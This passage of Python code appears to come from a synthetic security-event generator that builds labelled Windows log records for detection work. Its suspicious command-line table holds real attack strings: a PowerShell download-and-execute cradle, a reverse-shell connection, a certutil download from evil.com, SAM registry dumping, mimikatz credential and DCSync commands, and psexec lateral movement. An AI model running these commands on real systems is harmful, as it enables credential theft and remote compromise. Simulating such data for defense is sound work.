            severity=severity,
            src_host=event.get("src_host", ""),
            src_ip=event.get("src_ip", _rand_ip(True)),
            dst_host=event.get("dst_host", ""),
            dst_ip=event.get("dst_ip", ""),
            user=event.get("user", ""),
            process_name=event.get("process_name", ""),
            command_line=event.get("command_line", ""),
            description=desc,
            event_source="Windows Security",
            event_id_description="Generic security event",
            raw_data={k: v for k, v in event.items()
                      if k not in ("event_type", "timestamp", "is_malicious",
                                   "technique_id", "scenario_id")},
            tags=event.get("tags", []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    # ------------------------------------------------------------------
    # Suspicious command-line generator
    # ------------------------------------------------------------------

    @staticmethod
    def _gen_suspicious_cmdline(proc: str) -> str:
        templates: dict[str, list[str]] = {
            "powershell.exe": [
                "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0A",
                "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.99/payload.ps1')\"",
                "powershell.exe -c \"Get-Process | Out-File C:\\temp\\procs.txt\"",
                "powershell.exe -nop -c \"$c=New-Object Net.Sockets.TCPClient('10.0.0.99',4444);$s=$c.GetStream()\"",
            ],
            "cmd.exe": [
                "cmd.exe /c whoami /all > C:\\temp\\whoami.txt",
                "cmd.exe /c net user /domain",
                "cmd.exe /c reg save HKLM\\SAM C:\\temp\\sam.hiv",
                "cmd.exe /c type C:\\Users\\admin\\Desktop\\passwords.txt",
            ],
            "certutil.exe": [
                "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\update.exe",
                "certutil.exe -encode C:\\temp\\data.bin C:\\temp\\data.b64",
            ],
            "mimikatz.exe": [
                "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit",
            ],
            "psexec.exe": [
                "psexec.exe \\\\DC01 -u admin -p P@ssw0rd cmd.exe",
                "psexec.exe \\\\10.0.1.5 -s powershell.exe",
            ],
            "rundll32.exe": [
                "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();",
                "rundll32.exe C:\\Windows\\Temp\\payload.dll,DllMain",
            ],
            "wmic.exe": [
                "wmic process call create \"cmd.exe /c calc.exe\"",
                "wmic /node:10.0.1.10 process list brief",
            ],
        }
        options = templates.get(proc, [f"{proc} --suspicious-flag"])
        return random.choice(options)

    # ------------------------------------------------------------------
    # Handler dispatch table
    # ------------------------------------------------------------------

    _HANDLERS: dict[str, Any] = {
        # Authentication / auth
        "authentication": _auth_event,
        "auth": _auth_event,
        "logon": _auth_event,
        "login": _auth_event,
        "logout": _auth_event,
        # Process
        "process": _process_event,
        "process_create": _process_event,
        "execution": _process_event,
        # File access
        "file_access": _file_event,
        "file": _file_event,
        "file_create": _file_event,
        "file_write": _file_event,
        # Network
        "network": _network_event,
        "connection": _network_event,
        "network_connection": _network_event,
        # Firewall
        "firewall": _firewall_event,
        "firewall_event": _firewall_event,
        # DNS
        "dns": _dns_event,
        "dns_query": _dns_event,
        # Web / HTTP
        "web": _web_event,
        "web_access": _web_event,
        "web_browse": _web_event,
        "http": _web_event,
        # Email
        "email": _email_event,
        "email_send": _email_event,
        "email_receive": _email_event,
        "phishing": _email_event,
        # IDS
        "ids": _ids_event,
        "ids_event": _ids_event,
        "intrusion": _ids_event,
        # Database
        "database": _database_event,
        "database_query": _database_event,
        "db": _database_event,
        "sql": _database_event,
        # Security
        "security": _security_event,
        "security_event": _security_event,
        "alert": _security_event,
        # Application
        "application": _application_event,
        "application_use": _application_event,
        "app": _application_event,
    }
